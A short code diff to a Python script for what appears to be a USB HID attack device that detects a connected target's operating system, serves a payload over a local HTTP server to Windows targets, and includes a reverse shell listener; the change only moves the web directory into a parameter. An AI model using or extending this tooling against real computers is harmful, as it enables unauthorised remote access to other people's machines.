@@ -60,7 +60,7 @@ def reverse_shell_listener():
 		exit() # Using [ctrl+c] will terminate the listener.
 
 
-def payload():
+def payload(web_dir):
 	eco.change_hid()
 	connected=False
 	print("Waiting for network to come up")
@@ -69,10 +69,7 @@ def payload():
 		if(response == 0):
 			connected=True
 	print("Network up")
-
-	web_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'http'))
-	if(os.getcwd() != web_dir):
-		os.chdir(web_dir)
+	os.chdir(web_dir)
 	httpHandler = http.server.SimpleHTTPRequestHandler
 	httpd = socketserver.TCPServer(('',8000),httpHandler)
 	httplistener=Process(target=httpd.handle_request)
@@ -111,6 +108,7 @@ os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC 2>/dev/nu
 os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
 os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
 print("Waiting for connection...")
+web_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'http'))
 while(1):
 	if(eco.test_connection("/dev/hidg0", 1)):
 		print("Device connected to target")
@@ -127,7 +125,7 @@ while(1):
 		print("Target OS is: " + detectedos)
 		sleep(2)
 		if "Windows" == detectedos:
-			payload()
+			payload(web_dir)
 		print("Payload completed")
 		# Switch back to simple gadget
 		if "Windows" == detectedos:
